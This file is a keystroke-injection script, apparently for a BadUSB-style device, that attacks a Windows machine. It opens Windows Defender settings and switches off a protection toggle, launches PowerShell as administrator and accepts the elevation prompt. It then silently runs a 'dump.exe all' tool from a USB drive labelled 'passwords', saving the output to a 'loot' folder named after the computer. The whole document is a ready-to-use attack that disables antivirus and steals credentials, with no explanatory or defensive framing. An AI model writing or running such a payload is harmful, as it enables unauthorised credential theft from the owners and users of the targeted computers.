layout('us');
press("GUI r");
delay(1500);
type("windowsdefender://ThreatSettings")
delay(1200);
press("ENTER");
delay(2000);
press("SPACE");
delay(2000);
press("SHIFT TAB");
delay(1200);
press("ENTER");
delay(1500);
press("ALT F4");
delay(1500);
press("GUI r");
delay(1500);
type("powershell")
delay(2000);
press("CTRL SHIFT ENTER")
delay(1500);
press("SHIFT TAB");
delay(1100);
press("ENTER");
delay(1500);
press("ALT y");
delay(1500);
type("$dest = ((Get-WmiObject win32_volume -f 'label=''passwords''').Name+'\\loot\\')\n")
delay(1200);
type("$filter = 'password_'+ $env:COMPUTERNAME; $filecount = ((Get-ChildItem -filter ($filter + \"*\") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)\n")
delay(1200);
type("Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''passwords''').Name+'\\tools\\dump.exe') -ArgumentList 'all' -RedirectStandardOutput ($dest +'\\' + $filter +'_' + $filecount +'.txt')\n")
delay(2000);
type("exit\n")
